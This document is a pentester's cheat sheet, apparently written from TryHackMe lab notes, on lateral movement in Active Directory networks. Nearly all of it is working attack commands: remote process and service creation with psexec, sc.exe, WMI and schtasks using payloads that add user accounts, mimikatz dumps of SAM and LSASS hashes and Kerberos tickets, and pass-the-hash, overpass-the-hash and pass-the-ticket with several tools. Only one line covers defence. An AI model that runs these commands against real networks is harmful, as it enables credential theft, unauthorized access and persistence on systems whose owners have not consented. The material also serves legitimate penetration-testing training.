# AD Lateral Movement

# [=] **Spawning Processes Remotely**

## [+] runas.exe

### [-] Explanation

- In security assessments, you will often have network access and have just discovered AD credentials but have no means or privileges to create a new domain-joined machine. So we need the ability to use those credentials on a Windows machine we control.
- If we have the AD credentials in the format of <username>:<password>, we can use Runas, a legitimate Windows binary, to inject the credentials into memory.
- Once you run this command, you will be prompted to supply a password. Note that since we added the /netonly parameter, the credentials will not be verified directly by a domain controller so that it will accept any password. We still need to confirm that the network credentials are loaded successfully and correctly.
- **Note:** If you use your own Windows machine, you should make sure that you run your first Command Prompt as Administrator. This will inject an Administrator token into CMD. If you run tools that require local Administrative privileges from your Runas spawned CMD, the token will already be available. This does not give you administrative privileges on the network, but will ensure that any local commands you execute, will execute with administrative privileges.

### Using Injected Credentials

Now that we have injected our AD credentials into memory, this is where the  fun begins. With the /netonly option, all network communication will use these injected credentials for authentication. This includes all network communications of applications executed from that command prompt window.

### DNS

 

```powershell
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name '**Ethernet**' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

Of course, 'Ethernet' will be whatever interface is connected to the TryHackMe network. We can verify that DNS is working by running the following: `nslookup domain_name.local`

After providing the password, a new command prompt window will open. Now we still need to verify that our credentials are working. The most surefire way to do this is to list SYSVOL. Any AD account, no matter how low-privileged, can read the contents of the SYSVOL directory.

SYSVOL is a folder that exists on all domain controllers. It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.

```powershell
dir \\subdomain.domain.local\SYSVOL\
```

---

- Have you ever found AD credentials but nowhere to log in with them? Runas may be the answer you've been looking for!

```powershell
runas.exe /netonly /user:$domain\$username cmd.exe
```

- Options Explanation
    
    `/netonly` - Since we are not domain-joined, we want to load the credentials for network authentication but not authenticate against a domain controller. So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here.
     `/user` - Here, we provide the details of the domain and the username. It is always a safe bet to use the Fully Qualified Domain Name (FQDN) instead of just the NetBIOS name of the domain since this will help with resolution.
     `cmd.exe` - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since you can then use that to launch whatever you want, with the credentials injected.
    

### [-] Test credentials

to make sure that you have access to the account list `sysvol` content

```bash
dir \\$domain\sysvol
```

## [+] **Psexec.exe**

### Explanation

1 Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2 Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\\Windows\\psexesvc.exe.
3 Create some named pipes to handle stdin/stdout/stderr.

- **Required Group Memberships:** Administrators
    
    ```bash
    #EXAMPLE : Let's connect from workstation ws01 to the domain controller dc01 with domain administractor credentials:
    psexec64.exe \\$MACHINE_IP -u $username -p $password -i cmd.exe
    ```
    

## [+] WinRM

- **Required Group Memberships:** Administrators
    
    ```powershell
    	winrs.exe -u:$username -p:$password -**r**:$**r**emote_address $program.exe
    ```
    

## [+] Powershell

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

- Once we have our `PSCredential` object, we can create an interactive session using the `Enter-PSSession` cmdlet:
    
    ```powershell
    Enter-PSSession -Computername TARGET -Credential $credential
    ```
    
- `Powershell` also includes the Invoke-Command cmdlet, which runs `ScriptBlocks` remotely via WinRM. Credentials must be passed through a `PSCredential` object as well:
    
    ```powershell
    Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {**whoami**}
    ```
    

## [+] **SC.exe**

- **Required Group Memberships:** Administrators
    
    ```bash
    # Remotely Creating Services Using sc
    sc.exe \\\\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
    sc.exe \\\\TARGET start THMservice
    
    sc.exe \\\\TARGET stop THMservice
    sc.exe \\\\TARGET delete THMservice
    ```
    

---

# [=] Lateral Movement Using WMI

## [+] **Connecting to WMI Using Powershell**

```powershell
		$username = 'Administrator';
		$password = 'Mypass123';
		$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
		$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
		$Opt = New-CimSessionOption -Protocol DCOM
		$Session = New-Cimsession -ComputerName **$TARGET** -Credential $credential -SessionOption $Opt -ErrorAction Stops
```

- Protocols
    - **DCOM:** RPC over IP will be used for connecting to WMI.This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
    - **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

## [+] **Remote Process Creation Using WMI**

Note

```powershell

	$Command = "powershell.exe -Command Set-Content -Path C:\\text.txt -Value munrawashere";
	Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }
```

- On legacy systems, the same can be done using wmic from the command prompt
    
    ```powershell
    wmic.exe /user:**Administrator** /password:**Mypass123** /node:**TARGET** process call create "cmd.exe /c calc.exe"
    ```
    

## [+] **Creating Services Remotely Using WMI**

```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
	Name = "**ServiceName**";
	DisplayName = "**ServiceName**";
	PathName = "net user munra2 Pass123 /add"; # Your payload
	ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
	StartMode = "Manual"
	}
```

### [-] Start Service Remotely Using WMI

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '**ServiceName**'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
```

## [+] **Installing MSI packages Using WMI**

- Transfer MSI file to the target ADMIN$ share
    
    ```bash
    user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/'
    ```
    

### [-] Using WMI PowerShell connection

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "%windir%/myinstaller.msi"; Options = ""; AllUsers = $false}
```

### [-] Using wmic

```powershell
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

---

# [=] **Creating Scheduled Tasks Remotely**

## [+] Using `schtasks`

- You can create and run one remotely with `schtasks`, available in any Windows installation.
    
    ```bash
    schtasks /s $TARGET /RU "SYSTEM" /create /tn "**TaskName**" /tr "**<command/payload to execute>**" /sc ONCE /sd 01/01/1970 /st 00:00
    
    schtasks /s $TARGET /run /TN "**TaskName**"
    ```
    

## [+] Using WMI

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user **username** **password** /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "**TaskName**"
Start-ScheduledTask -CimSession $Session -TaskName "**TaskName**"
```

### [-] Delete the schedule task

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "**TaskName**"
```

# [=] Pass The Hash (PtH)

- you can do PtH with NTLM authentication not Kerberos

## [+] mimikatz

### [-] Dumping hashes Using mimikatz

### [-] Dump hashes from Local SAM

- This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

```powershell
cmd> ./mimikatz.exe
mimikatz> privilege::debug
mimikatz> token::elevate # elevate security token from high integrity to system integrity
mimikatz> lsadump::sam

```

### [-] Dump hashes from **LSASS**

This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

```bash
cmd> ./mimikatz.exe
mimikatz> privilege::debug
mimikatz> token::elevate # elevate security token from high integrity to system integrity
mimikatz> skurlsa::msv
```

```powershell
mimikatz> sekurlsa::pth /user:Administrator /domain:localhost /ntlm:**dumped_ntlm**
```

- or you can do Golden Ticket attack (preferable)

## [+] `pth-winexe`

```bash
pth-winexe -U $domain/$username**%**$hash //$ip cmd.exe
```

## [+] `XfreeRDP`

```bash
xfreerdp /v:$VictimIP /u:$domain\\$username /pth:$NTLM_hash
```

## [+] `Psexec` (Linux Version)

```bash
psexec.py -hashes $NTLM_hash $domain/$username@$Victim_IP
```

## [+] `evil-winrm`

```bash
evil-winrm -i $Victim_IP -u $username -H $NTLM_hash
```

---

# [=] **Overpass-the-hash / Pass-the-Key**

- you have NTLM hash, if you use it to authenticate using NTLM it’s Pass the Hash
- if you use it to create a TGT it’s Overpass the Hash
- this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.

```bash
cmd> ./mimikatz.exe
mimikatz> privilege::debug
mimikatz> token::elevate # elevate security token from high integrity to system integrity
mimikatz> lsadump::sam
mimikatz> sekurlsa::ekeys # List Kerberoas Encrypted Keys 
mimikatz> sekurlsa::pth /user:Administrator /domain:localhost /ntlm:**dumped_ntlm /run:powershell.exe**
```

---

# [=] Pass the Ticket (PtT)

<aside>
💡 how it works:

- During a pass the ticket attack, the attacker extracts a Kerberos **Ticket Granting Ticket (TGT)** from a system’s **LSASS** memory and then imports it on another system.
- then be used to request Kerberos service tickets (TGS) and subsequently gain access to network resources.
- there is no identifying information in the TGT regarding the computer the ticket came from.
</aside>

This kind of attack is similar to Pass the ticket/Key, but instead of using hashes to request a ticket, the ticket itself is stolen and used to authenticate as its owner.

Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account).

```bash
PS> mimikatz.exe
mimikatz> privilege::debug # Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
mimikatz> sekurlsa::tickets /export # this will export all of the .kirbi tickets into the directory that you are currently in
mimikatz> kerberos::ptt <ticket>.kirbi # Inject the ticket in our session (**Injecting tickets in our own session doesn't require administrator privileges.**)
mimikatz> klist #  Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
```

 You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.

![https://i.imgur.com/9nxjeTS.png](https://i.imgur.com/9nxjeTS.png)

## [+] Pass the Ticket Mitigation

Let's talk blue team and how to mitigate these types of attacks.

- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with

---

---

---

# [=] Distributed Component Object Model (DCOM)

Distributed Component Object Model is a proprietary Microsoft technology for communication between software components on networked computers. DCOM, which originally was called "Network OLE", extends Microsoft's COM, and provides the communication substrate under Microsoft's COM+ application server infrastructure.

running on port 135

Administrator access required to call DCOM service control manager 

since this requires MS office installed on the target computer this technique is best used against workstations, you can use it against DC if it has MS office installed

```powershell
$conn = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "Remote Workstation IP"))
$conn | Get-Member
```